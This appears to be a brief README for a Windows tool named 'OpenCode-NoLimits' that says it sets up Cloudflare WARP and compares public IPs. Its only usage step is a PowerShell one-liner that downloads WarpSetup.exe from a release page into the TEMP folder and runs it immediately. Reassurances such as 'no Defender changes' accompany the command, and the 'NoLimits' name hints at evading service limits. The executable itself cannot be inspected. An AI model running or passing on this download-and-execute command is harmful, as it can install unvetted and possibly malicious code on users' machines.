# OpenCode-NoLimits
by **X5Coder**

Helper tool: auto WARP setup + public IP check on Windows.

## Run (one command)
```powershell
powershell -c "iwr 'https://github.com/X5Coder/OpenCode-NoLimits/releases/download/v1.0/WarpSetup.exe' -OutFile \"$env:TEMP\WarpSetup.exe\"; Start-Process \"$env:TEMP\WarpSetup.exe\""
```

## Features
- Auto-installs official Cloudflare WARP if missing
- Connects WARP and waits for real connection
- Shows public IP + before/after comparison in terminal
- Official installer only, UAC consent, no Defender changes

Note: connection + IP check only; IP change not guaranteed.

